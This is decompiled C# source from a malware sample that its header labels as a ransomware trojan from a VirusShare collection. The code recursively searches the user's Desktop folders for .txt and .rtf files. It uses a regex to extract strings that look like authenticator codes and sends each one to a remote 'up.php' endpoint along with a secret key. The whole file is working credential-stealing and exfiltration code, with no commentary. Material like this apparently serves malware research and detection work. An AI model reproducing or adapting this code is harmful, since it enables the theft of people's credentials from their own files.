// Decompiled with JetBrains decompiler
// Type: PHP_Bot.RS.Auth.Auth
// Assembly: PHP Bot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4A73DBBE-CCD6-4C8A-915B-72A41BF05981
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Blocker.dfxz-5587203fc5e9b0dd6b0d3d299a783862a2204a5dd7f175fb859be97a0e6568ae.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;

namespace PHP_Bot.RS.Auth
{
  public class Auth
  {
    public List<string> auths = new List<string>();

    public Auth()
    {
      this.Search(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
      this.Search(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
      foreach (string auth in this.auths)
      {
        Stream stream = new WebClient().OpenRead(Config.Base + "up.php?secret=" + Config.Secret + "&auth=" + auth + "&action=auth");
        stream.ReadByte();
        stream.Close();
      }
    }

    private void Search(string dir)
    {
      try
      {
        foreach (string file in Directory.GetFiles(dir))
        {
          if (file.EndsWith("txt") || file.EndsWith("rtf"))
          {
            try
            {
              string input = "";
              StreamReader streamReader = new StreamReader(file);
              while (streamReader.Peek() > 0)
                input += streamReader.ReadLine();
              foreach (Match match in new Regex("[123456789]{1}[0-9]{0,3}(x|X)[0-9a-zA-Z]{7,20}").Matches(input))
              {
                if (!match.Value.StartsWith("0x"))
                  this.auths.Add(match.Value);
              }
            }
            catch
            {
            }
          }
        }
        foreach (string directory in Directory.GetDirectories(dir))
          this.Search(directory);
      }
      catch
      {
      }
    }
  }
}
